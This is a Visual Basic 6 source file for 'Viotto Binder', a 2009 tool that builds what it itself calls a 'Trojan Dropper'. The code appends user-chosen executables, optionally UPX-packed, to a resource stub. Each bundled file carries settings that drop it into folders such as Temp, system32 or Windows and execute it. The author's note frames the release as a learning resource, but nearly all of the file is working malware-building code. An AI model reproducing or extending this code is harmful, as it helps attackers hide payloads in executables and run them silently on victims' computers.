VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "mscomctl.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form BinderMainForm 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Viotto Binder"
   ClientHeight    =   2100
   ClientLeft      =   150
   ClientTop       =   540
   ClientWidth     =   7860
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   2100
   ScaleWidth      =   7860
   StartUpPosition =   2  'CenterScreen
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   960
      Top             =   120
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
      CancelError     =   -1  'True
   End
   Begin MSComctlLib.ListView BinderList 
      Height          =   2415
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   7935
      _ExtentX        =   13996
      _ExtentY        =   4260
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   0   'False
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   5
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "File path"
         Object.Width           =   3881
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "File name"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "File size"
         Object.Width           =   1677
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Text            =   "Drop into"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   4
         Text            =   "Execute"
         Object.Width           =   1588
      EndProperty
   End
   Begin VB.Menu MainMenu 
      Caption         =   "MainMenu"
      Begin VB.Menu AddFile 
         Caption         =   "Add file..."
      End
      Begin VB.Menu RemoveFile 
         Caption         =   "Remove file"
      End
      Begin VB.Menu ClearList 
         Caption         =   "Clear list"
      End
      Begin VB.Menu MenuDelimiter1 
         Caption         =   "-"
      End
      Begin VB.Menu DropIn 
         Caption         =   "Drop in"
         Begin VB.Menu AppPathDrop 
            Caption         =   "Application path"
         End
         Begin VB.Menu TempFolderDrop 
            Caption         =   "Temp"
         End
         Begin VB.Menu RootDrop 
            Caption         =   "Root"
         End
         Begin VB.Menu WindowsDrop 
            Caption         =   "Windows"
         End
         Begin VB.Menu systemDrop 
            Caption         =   "system32"
         End
         Begin VB.Menu ProgFilesDrop 
            Caption         =   "Program files"
         End
         Begin VB.Menu AppDataDrop 
            Caption         =   "Application data"
         End
         Begin VB.Menu CustomPathDrop 
            Caption         =   "Custom path..."
         End
      End
      Begin VB.Menu ExecuteFileMenu 
         Caption         =   "Execute"
         Begin VB.Menu ExecuteFileYes 
            Caption         =   "Yes"
         End
         Begin VB.Menu ExecuteFileNo 
            Caption         =   "No"
         End
      End
      Begin VB.Menu ChangeNameMenu 
         Caption         =   "Change file name..."
      End
      Begin VB.Menu MenuDelimiter2 
         Caption         =   "-"
      End
      Begin VB.Menu CompressFiles 
         Caption         =   "Pack files (UPX)"
         Checked         =   -1  'True
      End
      Begin VB.Menu BindFiles 
         Caption         =   "Create Dropper..."
      End
   End
End
Attribute VB_Name = "BinderMainForm"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'************************************************************
' Viotto Binder
' version 1.0
' Author: Viotto
' Date of 1st release: 14 october 2009
'
' I released this opensource for learning purposes,
' so I will be pleased if you learn something from it,
' but please don't rip without credits, thanks!
'************************************************************



Option Explicit

Private Declare Function PathFileExists Lib "shlwapi.dll" Alias "PathFileExistsA" (ByVal pszPath As String) As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Private FileNumber As Integer
Private Item As Object


Private Sub form_load()
MainMenu.Visible = False
End Sub


Private Sub BinderList_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)

If BinderList.ListItems.Count = 0 Then
RemoveFile.Enabled = False
ClearList.Enabled = False
DropIn.Enabled = False
ExecuteFileMenu.Enabled = False
BindFiles.Enabled = False
ChangeNameMenu.Enabled = False
CompressFiles.Enabled = False
Else
RemoveFile.Enabled = True
ClearList.Enabled = True
DropIn.Enabled = True
ExecuteFileMenu.Enabled = True
BindFiles.Enabled = True
ChangeNameMenu.Enabled = True
CompressFiles.Enabled = True
End If


If Button = vbRightButton Then PopupMenu MainMenu
End Sub

Private Sub AddFile_Click()
On Error GoTo ErrorHandler

CommonDialog1.DialogTitle = "Choose a file to bind"
CommonDialog1.Filter = "All files (*.*) | *.*"
CommonDialog1.ShowOpen



For FileNumber = 1 To BinderList.ListItems.Count
    If BinderList.ListItems.Item(FileNumber).Text = CommonDialog1.FileName Then
    MsgBox "This file is already listed!", vbExclamation
    Exit Sub
    End If
Next FileNumber
    
Set Item = BinderList.ListItems.Add

    Item.Text = CommonDialog1.FileName
    Item.SubItems(1) = CommonDialog1.FileTitle
    Item.SubItems(2) = Filesize(CommonDialog1.FileName)
    Item.SubItems(3) = "Temp"
    Item.SubItems(4) = "Yes"
    
ErrorHandler:
    If Err.Number = 53 Then
    If BinderList.ListItems.Count = 1 Then Call RemoveFile_Click
    Exit Sub
    End If
End Sub

Private Sub BindFiles_Click()
Dim OutputFile As String
Dim StubData() As Byte
Dim FileToBind As String, DataToBind As String
Dim DropPath As String, Execution As String, FileName As String

Dim UPXdata() As Byte
Dim UPXtempFile As String
UPXdata = LoadResData(102, "Packer")
UPXtempFile = App.Path & "\" & "UPXtemp.exe"

Const MainSplitter As String = "metalrock"
Const SubSplitter As String = "emopunk"

On Error GoTo ErrorHandler:

CommonDialog1.DialogTitle = "Please choose where to save output file"
CommonDialog1.FileName = "Trojan Dropper"
CommonDialog1.DefaultExt = "exe"
CommonDialog1.Filter = "Executables (*.exe)|*.exe|All Files (*.*)|*.*"
CommonDialog1.ShowSave


OutputFile = CommonDialog1.FileName

If PathFileExists(OutputFile) Then Kill OutputFile

StubData = LoadResData(101, "Stub")
Open OutputFile For Binary As #1
Put #1, , StubData
Close #1

If CompressFiles.Checked = True Then
Open UPXtempFile For Binary As #1
Put #1, , UPXdata
Close #1
End If

For FileNumber = 1 To BinderList.ListItems.Count



FileToBind = BinderList.ListItems.Item(FileNumber).Text
FileName = BinderList.ListItems.Item(FileNumber).SubItems(1)
DropPath = BinderList.ListItems.Item(FileNumber).SubItems(3)
Execution = BinderList.ListItems.Item(FileNumber).SubItems(4)

Open FileToBind For Binary As #1
DataToBind = Space(LOF(1))
Get #1, , DataToBind
Close #1

If CompressFiles.Checked = True Then
Dim TemporaryFile As String
TemporaryFile = App.Path & "\" & "tempfile" & ".exe"
Open TemporaryFile For Binary As #1
Put #1, , DataToBind
Close #1
Shell """" & UPXtempFile & """ """ & TemporaryFile & "", vbHide
Sleep 500
Open TemporaryFile For Binary As #1
DataToBind = Space(LOF(1))
Get #1, , DataToBind
Close #1
End If

Open OutputFile For Binary As #1
Put #1, LOF(1) + 1, MainSplitter & SubSplitter
Put #1, LOF(1) + 1, DataToBind
'                       1
Put #1, LOF(1) + 1, SubSplitter & DropPath & SubSplitter & Execution & SubSplitter & FileName & SubSplitter
'                                    2                         3                        4
'Put #1, LOF(1) + 1, MainSplitter
Close #1

If CompressFiles.Checked = True Then
Sleep 1000
Kill TemporaryFile
End If

Next FileNumber


If CompressFiles.Checked = True Then Kill UPXtempFile


MsgBox "Trojan Dropper file successfully built!" & vbNewLine & "Output file size: " & Filesize(OutputFile), vbInformation
Exit Sub

ErrorHandler:
If Err.Number = 32755 Then Err.Clear 'Error 32755: Cancel button pressed in CommonDialog
End Sub





Private Sub RemoveFile_Click()
If BinderList.ListItems.Count > 0 Then
BinderList.ListItems.Remove BinderList.SelectedItem.Index
End If
End Sub
Private Sub ClearList_Click()
BinderList.ListItems.Clear
End Sub




Private Sub AppPathDrop_Click()
BinderList.SelectedItem.SubItems(3) = "Application path"
End Sub

Private Sub RootDrop_Click()
BinderList.SelectedItem.SubItems(3) = "Root"
End Sub

Private Sub systemDrop_Click()
BinderList.SelectedItem.SubItems(3) = "system32"
End Sub

Private Sub TempFolderDrop_Click()
BinderList.SelectedItem.SubItems(3) = "Temp"
End Sub

Private Sub WindowsDrop_Click()
BinderList.SelectedItem.SubItems(3) = "Windows"
End Sub

Private Sub ProgFilesDrop_Click()
BinderList.SelectedItem.SubItems(3) = "Program files"
End Sub

Private Sub AppDataDrop_Click()
BinderList.SelectedItem.SubItems(3) = "Application data"
End Sub

Private Sub CustomPathDrop_Click()
ChooseCustomPath.Show
End Sub



Private Sub ExecuteFileYes_Click()
BinderList.SelectedItem.SubItems(4) = "Yes"
End Sub


Private Sub ExecuteFileNo_Click()
BinderList.SelectedItem.SubItems(4) = "No"
End Sub


Private Sub ChangeNameMenu_Click()
ChangeNameForm.Show
ChangeNameForm.NewFileName.Text = BinderList.SelectedItem.SubItems(1)
End Sub

Private Sub CompressFiles_Click()
If CompressFiles.Checked = False Then
CompressFiles.Checked = True
Exit Sub
End If

If CompressFiles.Checked = True Then
CompressFiles.Checked = False
End If
End Sub


Private Function Filesize(File As String) As String
    Dim bytes As String
    Dim Size As String
    bytes = FileLen(File)
    If bytes > 1024 Then
        Size = " KB"
        bytes = bytes / 1024
    Else
        Size = " Bytes"
    End If
    If bytes > 1024 Then
        Size = " MB"
        bytes = bytes / 1024
    End If
    Filesize = Round(bytes, 2) & Size
End Function
